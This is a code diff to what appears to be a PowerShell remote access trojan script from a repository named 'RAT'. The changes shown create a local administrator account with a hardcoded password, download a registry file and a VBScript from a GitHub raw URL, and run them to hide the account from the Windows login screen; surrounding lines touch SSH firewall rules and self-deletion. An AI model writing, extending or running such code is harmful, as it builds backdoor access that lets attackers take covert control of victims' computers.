@@ -29,15 +29,21 @@ $uname = random_text
 $pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
+#goto temp and make working directory
+mkdir $path
+cd $path
+
 # registry to hide local admin
-$registry_name = random_text 
-(
-    echo Windows Registry Editor Version 5.00
-    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
-    echo "rat"=dword:00000000 ; ) > "$registry_name.reg"
+$reg_file = random_text 
+Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/admin.reg -OutFile "$reg_file.reg"
+
+#visual bacic script to registor the registory
+$vbs_file = random_text
+Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 
-
+#install the registry
+./"$reg_file.reg"; "$vbs_file.vbs"
 
 #cd $env:temp
 #$directory_name = random_text
@@ -59,9 +65,7 @@ Get-NetFirewallRule -Name *ssh*
 
 # 
 
-#goto temp and make working directory
-mkdir $path
-cd $path
+
 
 # self delete
 #cd $initial_dir
